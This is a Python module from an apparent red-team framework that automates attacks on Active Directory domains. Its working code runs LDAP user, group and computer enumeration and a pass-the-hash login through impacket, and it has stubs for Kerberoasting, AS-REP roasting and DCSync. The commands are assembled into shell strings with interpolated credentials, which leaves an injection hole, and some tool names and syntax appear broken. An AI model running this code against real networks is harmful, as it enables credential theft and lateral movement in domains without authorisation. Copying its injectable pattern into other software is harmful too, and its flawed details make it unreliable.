"""
Active Directory Module
FOR AUTHORIZED SECURITY TESTING ONLY

Usage for Red Teaming:
---------------------
The Active Directory module performs AD enumeration, Kerberos attacks, and AD-specific
exploitation techniques. This module is essential for red teaming Windows domain environments.

Example Usage:
    from utils.logger import FrameworkLogger
    from core.modules.active_directory import ActiveDirectory
    
    # Initialize logger and module
    logger = FrameworkLogger("ad_test")
    ad = ActiveDirectory(logger, domain="example.local", dc_ip="192.168.1.10")
    
    # Enumerate domain users
    users = ad.enumerate_users()
    print(f"Users found: {len(users['users'])}")
    
    # Enumerate domain groups
    groups = ad.enumerate_groups()
    print(f"Groups found: {len(groups['groups'])}")
    
    # Kerberos pre-authentication attack
    kerberoast = ad.kerberoast(username="user", password="pass")
    print(f"Tickets obtained: {len(kerberoast['tickets'])}")
    
    # AS-REP roasting
    asrep = ad.asrep_roast(username="user")
    print(f"AS-REP hash: {asrep['hash']}")

Red Team Use Cases:
- Domain user enumeration
- Group enumeration
- Computer enumeration
- Kerberos ticket attacks (Kerberoasting, AS-REP roasting)
- BloodHound data collection
- Pass-the-hash attacks
- DCSync attacks
- Golden ticket attacks
"""

from typing import Dict, List, Optional
import time
import subprocess
import socket
from utils.logger import FrameworkLogger


class ActiveDirectory:
    """Active Directory module"""
    
    def __init__(self, logger: FrameworkLogger, domain: str, dc_ip: Optional[str] = None):
        """
        Initialize Active Directory module
        
        Args:
            logger: Logger instance
            domain: Domain name (e.g., "example.local")
            dc_ip: Domain controller IP address (optional)
        """
        self.logger = logger
        self.domain = domain
        self.dc_ip = dc_ip or self._find_dc()
        self.enumeration_data = {}
    
    def enumerate_users(self, username: Optional[str] = None, password: Optional[str] = None) -> Dict:
        """
        Enumerate domain users
        
        Args:
            username: Username for authentication (optional)
            password: Password for authentication (optional)
        
        Returns:
            Dictionary containing enumerated users
        """
        self.logger.info(f"Enumerating users in domain {self.domain}")
        
        results = {
            "domain": self.domain,
            "dc_ip": self.dc_ip,
            "users": [],
            "timestamp": time.time()
        }
        
        try:
            # Use ldapsearch or impacket
            if username and password:
                cmd = f'ldapsearch -x -H ldap://{self.dc_ip} -D "{username}@{self.domain}" -w {password} -b "dc={self.domain.replace(\".\", \",dc=\")}" "(objectClass=user)" sAMAccountName'
            else:
                cmd = f'ldapsearch -x -H ldap://{self.dc_ip} -b "dc={self.domain.replace(\".\", \",dc=\")}" "(objectClass=user)" sAMAccountName'
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                # Parse users from output
                import re
                users = re.findall(r'sAMAccountName:\s*(\S+)', result.stdout)
                results["users"] = [{"username": user} for user in users]
            else:
                results["note"] = "User enumeration requires valid credentials or anonymous LDAP access"
                
        except Exception as e:
            self.logger.error(f"User enumeration failed: {e}")
            results["error"] = str(e)
        
        self.enumeration_data["users"] = results
        return results
    
    def enumerate_groups(self, username: Optional[str] = None, password: Optional[str] = None) -> Dict:
        """
        Enumerate domain groups
        
        Args:
            username: Username for authentication (optional)
            password: Password for authentication (optional)
        
        Returns:
            Dictionary containing enumerated groups
        """
        self.logger.info(f"Enumerating groups in domain {self.domain}")
        
        results = {
            "domain": self.domain,
            "dc_ip": self.dc_ip,
            "groups": [],
            "timestamp": time.time()
        }
        
        try:
            if username and password:
                cmd = f'ldapsearch -x -H ldap://{self.dc_ip} -D "{username}@{self.domain}" -w {password} -b "dc={self.domain.replace(\".\", \",dc=\")}" "(objectClass=group)" sAMAccountName'
            else:
                cmd = f'ldapsearch -x -H ldap://{self.dc_ip} -b "dc={self.domain.replace(\".\", \",dc=\")}" "(objectClass=group)" sAMAccountName'
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                import re
                groups = re.findall(r'sAMAccountName:\s*(\S+)', result.stdout)
                results["groups"] = [{"name": group} for group in groups]
            else:
                results["note"] = "Group enumeration requires valid credentials"
                
        except Exception as e:
            self.logger.error(f"Group enumeration failed: {e}")
            results["error"] = str(e)
        
        self.enumeration_data["groups"] = results
        return results
    
    def enumerate_computers(self, username: Optional[str] = None, password: Optional[str] = None) -> Dict:
        """
        Enumerate domain computers
        
        Args:
            username: Username for authentication (optional)
            password: Password for authentication (optional)
        
        Returns:
            Dictionary containing enumerated computers
        """
        self.logger.info(f"Enumerating computers in domain {self.domain}")
        
        results = {
            "domain": self.domain,
            "dc_ip": self.dc_ip,
            "computers": [],
            "timestamp": time.time()
        }
        
        try:
            if username and password:
                cmd = f'ldapsearch -x -H ldap://{self.dc_ip} -D "{username}@{self.domain}" -w {password} -b "dc={self.domain.replace(\".\", \",dc=\")}" "(objectClass=computer)" dNSHostName'
            else:
                cmd = f'ldapsearch -x -H ldap://{self.dc_ip} -b "dc={self.domain.replace(\".\", \",dc=\")}" "(objectClass=computer)" dNSHostName'
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                import re
                computers = re.findall(r'dNSHostName:\s*(\S+)', result.stdout)
                results["computers"] = [{"hostname": comp} for comp in computers]
            else:
                results["note"] = "Computer enumeration requires valid credentials"
                
        except Exception as e:
            self.logger.error(f"Computer enumeration failed: {e}")
            results["error"] = str(e)
        
        self.enumeration_data["computers"] = results
        return results
    
    def kerberoast(self, username: str, password: str, spn: Optional[str] = None) -> Dict:
        """
        Perform Kerberoasting attack
        
        Args:
            username: Username for authentication
            password: Password for authentication
            spn: Specific SPN to target (optional)
        
        Returns:
            Dictionary containing Kerberoasting results
        """
        self.logger.info(f"Performing Kerberoasting attack")
        
        results = {
            "domain": self.domain,
            "username": username,
            "tickets": [],
            "timestamp": time.time()
        }
        
        # Kerberoasting requires impacket-GetUserSPNs or similar
        # This is a placeholder for real implementation
        results["note"] = "Kerberoasting requires impacket-GetUserSPNs or similar tool"
        results["tickets"] = []
        
        return results
    
    def asrep_roast(self, username: str) -> Dict:
        """
        Perform AS-REP roasting attack
        
        Args:
            username: Username to roast
        
        Returns:
            Dictionary containing AS-REP roasting results
        """
        self.logger.info(f"Performing AS-REP roasting for {username}")
        
        results = {
            "domain": self.domain,
            "username": username,
            "hash": None,
            "timestamp": time.time()
        }
        
        # AS-REP roasting requires impacket-GetNPUsers or similar
        # This is a placeholder for real implementation
        results["note"] = "AS-REP roasting requires impacket-GetNPUsers or similar tool"
        
        return results
    
    def pass_the_hash(self, username: str, ntlm_hash: str, target: str, service: str = "smb") -> Dict:
        """
        Perform pass-the-hash attack
        
        Args:
            username: Username
            ntlm_hash: NTLM hash
            target: Target host
            service: Service to access (smb, rdp, etc.)
        
        Returns:
            Dictionary containing pass-the-hash results
        """
        self.logger.info(f"Performing pass-the-hash attack")
        
        results = {
            "username": username,
            "target": target,
            "service": service,
            "success": False,
            "timestamp": time.time()
        }
        
        try:
            # Use impacket or similar tools
            if service == "smb":
                cmd = f'impacket-smbclient -hashes :{ntlm_hash} {username}@{target}'
            elif service == "rdp":
                cmd = f'impacket-xfreerdp -hashes :{ntlm_hash} {username}@{target}'
            else:
                results["error"] = f"Unsupported service: {service}"
                return results
            
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
            results["success"] = result.returncode == 0
            
        except Exception as e:
            self.logger.error(f"Pass-the-hash failed: {e}")
            results["error"] = str(e)
            results["note"] = "Pass-the-hash requires impacket suite"
        
        return results
    
    def dcsync(self, username: str, password: str, target_user: Optional[str] = None) -> Dict:
        """
        Perform DCSync attack
        
        Args:
            username: Username with DCSync rights
            password: Password
            target_user: Specific user to sync (optional, syncs all if None)
        
        Returns:
            Dictionary containing DCSync results
        """
        self.logger.info(f"Performing DCSync attack")
        
        results = {
            "domain": self.domain,
            "username": username,
            "target_user": target_user,
            "hashes": [],
            "timestamp": time.time()
        }
        
        # DCSync requires impacket-secretsdump or Mimikatz
        # This is a placeholder for real implementation
        results["note"] = "DCSync requires impacket-secretsdump or Mimikatz"
        
        return results
    
    def _find_dc(self) -> Optional[str]:
        """Find domain controller"""
        try:
            import socket
            # Try to resolve domain controller
            dc_hostname = f"dc.{self.domain}"
            ip = socket.gethostbyname(dc_hostname)
            return ip
        except Exception:
            # Try common DC hostnames
            for dc_name in ["dc", "dc01", "domain-controller"]:
                try:
                    dc_hostname = f"{dc_name}.{self.domain}"
                    ip = socket.gethostbyname(dc_hostname)
                    return ip
                except Exception:
                    continue
        return None
    
    def get_enumeration_data(self) -> Dict:
        """Get all enumeration data"""
        return self.enumeration_data

